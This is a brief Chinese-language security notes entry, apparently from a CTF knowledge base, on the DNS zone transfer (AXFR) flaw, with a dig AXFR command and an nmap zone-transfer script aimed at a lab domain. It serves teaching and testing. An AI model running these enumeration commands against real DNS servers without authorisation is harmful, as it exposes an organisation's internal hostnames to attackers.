---
title: DNS 域传送漏洞（AXFR）
category: code-audit
tags: [dns, zone-transfer, axfr, bind9, information-disclosure]
triggers: [DNS域传送, axfr, 区域传送, dns-zone-transfer, dig, Bind9, 子域名枚举]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/DNS域传送漏洞.md]
---

## Summary

DNS 服务器未限制 AXFR 请求来源时，可获取完整 DNS 区域记录（所有子域名）。

## Details

### 漏洞描述

DNS 协议支持使用 axfr 类型的记录进行区域传送（Zone Transfer），用于主从同步。若管理员未限制获取记录的来源，将导致域传送漏洞。

### 利用方法

```bash
# 使用 dig 发送 axfr 请求
dig @your-ip -t axfr vulhub.org

# 使用 nmap 脚本扫描
nmap --script dns-zone-transfer.nse --script-args "dns-zone-domain=vulhub.org" -Pn -p 53 your-ip
```

## Connections

- GHSA: [[code-audit/ghsa-privilege-escalation]]
